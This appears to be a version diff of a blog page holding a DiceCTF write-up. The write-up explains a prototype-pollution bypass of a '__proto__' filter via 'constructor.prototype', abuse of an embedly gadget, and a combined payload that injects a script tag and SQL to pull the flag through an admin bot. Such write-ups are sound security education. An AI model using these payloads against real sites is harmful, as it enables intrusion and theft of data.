-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">safeDeepMerge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) =&gt; {
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
-        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">mergableTypes</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mergableTypes</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>])){
-            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">key</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;__proto__&#39;</span>){
-                <span style="color:#a6e22e">safeDeepMerge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]);
-            }
-        }<span style="color:#66d9ef">else</span>{
-            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>];
-        }
-    }
-}
-</code></pre></div><p>This is a function that merges 2 js objects together. Typically, JSON merges like this function are prime targets for a vulnerability known as <strong>prototype pollution</strong>, an exploit unique to javascript that leverages the functionality of the prototype-based language. To summarize, one can modify the prototype properties of an object and pollute every object inheriting from that same prototype in javascript with the keyword <code>__proto__</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mergableTypes</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;boolean&#39;</span>, <span style="color:#e6db74">&#39;string&#39;</span>, <span style="color:#e6db74">&#39;number&#39;</span>, <span style="color:#e6db74">&#39;bigint&#39;</span>, <span style="color:#e6db74">&#39;symbol&#39;</span>, <span style="color:#e6db74">&#39;undefined&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">safeDeepMerge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">mergableTypes</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mergableTypes</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>])){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">key</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;__proto__&#39;</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">safeDeepMerge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is a function that merges 2 js objects together. Typically, JSON merges like this function are prime targets for a vulnerability known as <strong>prototype pollution</strong>, an exploit unique to javascript that leverages the functionality of the prototype-based language. To summarize, one can modify the prototype properties of an object and pollute every object inheriting from that same prototype in javascript with the keyword <code>__proto__</code>.</p>
 <p>Unfortunately, this is a slightly safer merge since the function explicitly looks out for the <code>__proto__</code> keyword. The <code>__proto__</code> keyword is an object property that accesses the <code>Object.prototype</code> of a js object literal. <code>safeDeepMerge</code> will be iterating through the keys of a given JSON parameter looking for it, so we need to access <code>Object.prototype</code> in a different way. Unfortunately, we can&rsquo;t just straight up input <code>Object.prototype</code> because of the value <code>mergableTypes</code> - among that list, <code>Object</code> is not one of them, so <code>safeDeepMerge</code> will bypass <code>Object</code> too. However, <code>Object</code> itself can be accessed without explicitly declaring it. You can specify an instance of the basic javascript object with the constructor method. Therefore, <code>constructor.prototype</code> = <code>Object.prototype</code> = <code>__proto__</code>. We can use <code>constructor.prototype</code> to bypass <code>safeDeepMerge</code>!</p>
 <p>How can we use this to our advantage? In the widget panel, there&rsquo;s an example widget of a reddit page using embedly. Doing some <a href="https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md">googling</a> leads us to discover that prototype pollution through the embedly script is possible!</p>
 <p>I&rsquo;ll skip the parts where I banged my head against the wall for a long time trying to use prototype pollution to craft an XSS payload on the page. The problem with that was the strict CSP, which was the same one as &ldquo;Build A Panel&rdquo;:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">default-src <span style="color:#e6db74">&#39;none&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; style-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; connect-src <span style="color:#e6db74">&#39;self&#39;</span> https://www.reddit.com/comments/;
-</code></pre></div><p>In short, I can&rsquo;t execute anything since the script-src is either <code>self</code> or from <code>embedly.com</code>. So what now?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>default-src <span style="color:#e6db74">&#39;none&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; style-src <span style="color:#e6db74">&#39;self&#39;</span> http://cdn.embedly.com/; connect-src <span style="color:#e6db74">&#39;self&#39;</span> https://www.reddit.com/comments/;
+</span></span></code></pre></div><p>In short, I can&rsquo;t execute anything since the script-src is either <code>self</code> or from <code>embedly.com</code>. So what now?</p>
 <p>Let&rsquo;s take a look at the regex that the admin bot has again: <code>^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$</code></p>
 <p>The endpoint in question is outlined below:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/create&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
-
-    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;panelId&#39;</span>]){
-        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">newPanelId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;debugid&#39;</span>] <span style="color:#f92672">||</span> <span style="color:#a6e22e">uuidv4</span>();
-    
-        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;panelId&#39;</span>, <span style="color:#a6e22e">newPanelId</span>, {<span style="color:#a6e22e">maxage</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10800</span>, <span style="color:#a6e22e">httponly</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">sameSite</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;strict&#39;</span>});
-    }
-
-    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/panel/&#39;</span>);
-});
-
-<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/panel/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
-
-    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;panelId&#39;</span>]){
-        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;pages/panel&#39;</span>);
-    }<span style="color:#66d9ef">else</span>{
-        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
-    }
-});
-</code></pre></div><p><code>/create</code> accepts one query, <code>debugId</code>, which renders a <code>pages/panel</code> when provided. In there, the <code>custom.js</code> file is loaded, which features the <code>safeDeepMerge</code> function. So, if we can create some specific widget that uses prototype pollution to execute rogue code, then we can just send that widget&rsquo;s <code>debugId</code> to the admin and get the flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/create&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;panelId&#39;</span>]){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">newPanelId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;debugid&#39;</span>] <span style="color:#f92672">||</span> <span style="color:#a6e22e">uuidv4</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;panelId&#39;</span>, <span style="color:#a6e22e">newPanelId</span>, {<span style="color:#a6e22e">maxage</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10800</span>, <span style="color:#a6e22e">httponly</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">sameSite</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;strict&#39;</span>});
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/panel/&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/panel/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;panelId&#39;</span>]){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;pages/panel&#39;</span>);
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p><code>/create</code> accepts one query, <code>debugId</code>, which renders a <code>pages/panel</code> when provided. In there, the <code>custom.js</code> file is loaded, which features the <code>safeDeepMerge</code> function. So, if we can create some specific widget that uses prototype pollution to execute rogue code, then we can just send that widget&rsquo;s <code>debugId</code> to the admin and get the flag!</p>
 <h3 id="combining-it-all">Combining it all</h3>
 <p>So, we can have an admin take a look at a specific panel using <code>/create?debugId=x</code> and we can craft that panel to execute rogue code based on abusing the functionality of <code>safeDeepMerge</code> to execute prototype pollution. We just need to combine the payload from &ldquo;Build a Panel&rdquo; with a payload that constructs a widget executing the pollution, and grab that widget&rsquo;s <code>debugId</code> so the admin will visit it.</p>
 <p>So, we simply need to add a new panel with our payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{<span style="color:#f92672">&#34;widgetName&#34;</span>:<span style="color:#e6db74">&#34;constructor&#34;</span>,<span style="color:#f92672">&#34;widgetData&#34;</span>:<span style="color:#e6db74">&#34;{\&#34;prototype\&#34;:{\&#34;srcdoc\&#34;:\&#34;&lt;script src=&#39;/admin/debug/add_widget?panelid=vie99vie&amp;widgetname=whatev&amp;widgetdata=&#39;),(&#39;vie99vie&#39;, (select flag from flag), &#39;{&#34;</span><span style="color:#960050;background-color:#1e0010">type</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#960050;background-color:#1e0010">whatev&#34;</span>}<span style="color:#960050;background-color:#1e0010">&#39;)</span> <span style="color:#960050;background-color:#1e0010">--</span>
-</code></pre></div><p>Once we file this request, we just have to report to the admin the url <code>https://build-a-better-panel.dicec.tf/create/?debugId=vie99vie</code> and check back to our panel to retrieve the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;widgetName&#34;</span>:<span style="color:#e6db74">&#34;constructor&#34;</span>,<span style="color:#f92672">&#34;widgetData&#34;</span>:<span style="color:#e6db74">&#34;{\&#34;prototype\&#34;:{\&#34;srcdoc\&#34;:\&#34;&lt;script src=&#39;/admin/debug/add_widget?panelid=vie99vie&amp;widgetname=whatev&amp;widgetdata=&#39;),(&#39;vie99vie&#39;, (select flag from flag), &#39;{&#34;</span><span style="color:#960050;background-color:#1e0010">type</span><span style="color:#e6db74">&#34;:&#34;</span><span style="color:#960050;background-color:#1e0010">whatev&#34;</span>}<span style="color:#960050;background-color:#1e0010">&#39;)</span> <span style="color:#960050;background-color:#1e0010">--</span>
+</span></span></code></pre></div><p>Once we file this request, we just have to report to the admin the url <code>https://build-a-better-panel.dicec.tf/create/?debugId=vie99vie</code> and check back to our panel to retrieve the flag.</p>
 <p>This was quite the challenge, which involved a lot of working parts and required me to test the depth of my knowledge on classic, established web exploits. I learned alot, and while I may have taken a while in wrapping my head around it, I&rsquo;m glad I was able to understand it eventually.</p>
 <p><strong>Vie</strong></p>
 
@@ -437,9 +437,9 @@ This means that if we try to inject single quotes ourselves to try a classic sql
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://jamvie.net/tags/writeups">writeups</a></span><span class="tag"><a href="https://jamvie.net/tags/xss">xss</a></span><span class="tag"><a href="https://jamvie.net/tags/sqli">sqli</a></span><span class="tag"><a href="https://jamvie.net/tags/web">web</a></span><span class="tag"><a href="https://jamvie.net/tags/prototype-pollution">prototype-pollution</a></span><span class="tag"><a href="https://jamvie.net/tags/csrf">csrf</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2260 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2261 Words</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-02-07 18:06 -0800</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-02-07 19:06 -0700</p>
         </div>
 
         
@@ -502,7 +502,7 @@ This means that if we try to inject single quotes ourselves to try a classic sql
 
 
 
-<script type="text/javascript" src="https://jamvie.net/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="https://jamvie.net/bundle.min.af5a3e743efae0c74305dc03080fb4bd5ae8f1a60160b3599ab59639ad6c182d763fb4238e72a726f48319ad132a4cdc9cd51fac5462e8a25dc0ba096f547038.js" integrity="sha512-r1o&#43;dD764MdDBdwDCA&#43;0vVro8aYBYLNZmrWWOa1sGC12P7QjjnKnJvSDGa0TKkzcnNUfrFRi6KJdwLoJb1RwOA=="></script>
     
 <script type="application/javascript">
 var doNotTrack = false;
